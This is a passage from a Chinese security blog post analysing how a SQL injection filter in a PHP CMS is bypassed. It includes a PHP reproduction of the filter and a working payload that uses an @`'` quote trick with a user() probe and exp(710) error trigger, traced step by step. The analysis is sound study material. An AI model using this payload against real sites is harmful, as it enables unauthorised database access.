22、因为直接看有点搞不清楚具体逻辑，于是我将其单独拎出来，编写成一个 php 文件运行调试

```
<?php

function sql_injection($db_string)
{
    $clean = '';
    $error = '';
    $old_pos = 0;
    $pos = -1;
    while (true) {
        $pos = strpos($db_string, '\'', $pos + 1);
        if ($pos === false) {
            break;
        }
        $clean .= substr($db_string, $old_pos, $pos - $old_pos);
        while (true) {
            $pos1 = strpos($db_string, '\'', $pos + 1);
            $pos2 = strpos($db_string, '\\', $pos + 1);
            if ($pos1 === false) {
                break;
            } else {
                if ($pos2 == false || $pos1 < $pos2) {
                    $pos = $pos1;
                    break;
                }
            }
            $pos = $pos2 + 1;
        }
        $clean .= '$s$';
        $old_pos = $pos + 1;
    }
    $clean .= substr($db_string, $old_pos);
    $clean = trim(strtolower(preg_replace(array('~\\s+~s'), array(' '), $clean)));
  echo $clean;
}
$a = "select count(*) as total from doc_keywords where 1=1 and category='1' and@`'` or if(substr(user(),1,4)='root',1,exp(710))#'";
sql_injection($a);
?>
```

可以看到输出结果已经去掉了后面的语句![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZSdc7tsukDwmavvLYomJjdjJXxib6YicFTChnZxa1DGmMGA0iaP9PjCiaVg/640?wx_fmt=png) 23、因为后面的过滤都是过滤 $clean，而这里很明显看到，$clean 已经被 **@`'`**截断了，所以绕过了经过调试分析代码，我理解了，在原来的获取注入点检测的逻辑，是将单引号里面的值替换为 $s$，所以正常的 SQL 语句提取结果应该是：

```
select count(*) as total from doc_keywords where 1=1 and category='1' and or if(substr(user(),1,4)='root',1,exp(710))#'

#1、找第1、2个单引号
select count(*) as total from doc_keywords where 1=1 and category='1'

#2、找第3、4个单引号
and or if(substr(user(),1,4)='root'
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZxN1ClDrQaq7B4luYnqoiavg252yHknYe2NfjGkVsOQ1e21OicaPMd6dw/640?wx_fmt=png)24、再看看加了单引号之后的效果

```
select count(*) as total from doc_keywords where 1=1 and category='1' and@`'` or if(substr(user(),1,4)='root',1,exp(710))#'

#1、找第1、2个单引号
select count(*) as total from doc_keywords where 1=1 and category='1'

#2、找第3、4个单引号
'` or if(substr(user(),1,4)='

#3、第5个单引号后面到注释符前都没有单引号，所以不构成一对，不进行拼接
```

![](https://mmbiz.qpic.cn/mmbiz_png/khmibjLuVibFB7nBUvkuBwNChuvrOXX0UZSnKCR6HsShiacs8E0TtToI8FvpjI9VrBtjvHibicAmzCm0Js2kOvzhKlg/640?wx_fmt=png)搞懂了，瞬间觉得师傅们的思路太强了。  

(六) 小结
------

大概整理了几个漏洞，本来是想说 SQL 注入可以简单过一遍的，但是在 2017 那个 SQL 注入那里，我学到了好多，分析这个漏洞也是最花时间的。这应该可以说是干货了，也因为之前没有接触过，所以被惊了一下。后面我会继续进行分析，大家一起学习。

关注我们

  

公众号